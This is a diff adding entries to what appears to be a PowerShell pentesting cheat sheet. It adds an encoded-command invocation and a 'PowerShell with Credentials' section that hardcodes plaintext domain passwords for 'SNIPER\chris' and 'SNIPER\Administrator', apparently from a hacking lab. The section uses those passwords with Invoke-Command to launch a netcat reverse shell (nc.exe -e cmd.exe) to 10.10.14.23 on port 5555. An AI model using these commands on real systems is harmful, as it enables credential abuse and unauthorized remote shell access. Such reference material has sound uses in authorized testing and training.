@@ -377,6 +377,7 @@ powershell -Command "& { Get-EventLog -LogName security}"
 ```text
 powershell -EncodedCommand [Base64_encoded_command]
 powershell -enc [B64_encoded_command]
+powershell.exe /enc <base64>
 ```
 
 ### Man in PS
@@ -512,6 +513,24 @@ After importing, you can view the available commands:
 
 ```text
 Get-Command -Module <Module Name>
+```
+
+## PowerShell with Credentials
+
+Running cmdlets with credentials:
+
+```text
+$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
+```
+
+Running a Reverse Shell:
+
+```text
+$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 5555} -credential $credential;
 ```
 
 ## Scripts
